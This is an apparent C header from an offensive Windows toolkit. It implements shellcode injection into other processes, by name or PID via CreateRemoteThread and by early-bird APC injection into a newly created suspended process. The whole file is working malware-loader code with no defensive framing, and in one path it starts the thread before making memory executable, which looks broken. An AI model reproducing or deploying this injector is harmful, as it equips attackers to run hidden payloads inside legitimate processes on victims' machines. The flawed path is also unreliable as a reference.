#ifndef INJECTORS_INCLUDED
#define INJECTORS_INCLUDED
#include <windows.h>
#include "../utils/process.h"
static void injectCRT(HANDLE hProc, const unsigned char* shellcode, int sz, int rwx){
    unsigned char* buf;
    if(rwx)
        buf = VirtualAllocEx(hProc, NULL, sz, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    else
        buf = VirtualAllocEx(hProc, NULL, sz, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    WriteProcessMemory(hProc, buf, shellcode, sz, NULL);
    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    if(!rwx){
        DWORD old;
        VirtualProtectEx(hProc, buf, sz, PAGE_EXECUTE_READ, &old);
    }
}
void injectProcess(const char* name, const unsigned char* shellcode, int sz, int rwx){
    HANDLE hProc = processByName(name);
    if(hProc == NULL) return;
    injectCRT(hProc, shellcode, sz, rwx);
    CloseHandle(hProc);
}
void injectPid(DWORD pid, const unsigned char* shellcode, int sz, int rwx){
    HANDLE hProc = processByPid(pid);
    if(hProc == NULL) return;
    injectCRT(hProc, shellcode, sz, rwx);
    CloseHandle(hProc);
}

void injectAPC(const char* name, const unsigned char* shellcode, int sz, int rwx){
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    CreateProcessA(name, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE proc = pi.hProcess;
    HANDLE thd = pi.hThread;
    
    LPVOID shc;
    if(rwx)
        shc = VirtualAllocEx(proc, NULL, sz, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    else
        shc = VirtualAllocEx(proc, NULL, sz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shc;

    WriteProcessMemory(proc, shc, shellcode, sz, NULL);
    if(!rwx){
        DWORD old;
        VirtualProtectEx(proc, shc, sz, PAGE_EXECUTE_READ, &old);
    }
    QueueUserAPC((PAPCFUNC)apcRoutine, thd, 0);
    ResumeThread(thd);
}
#endif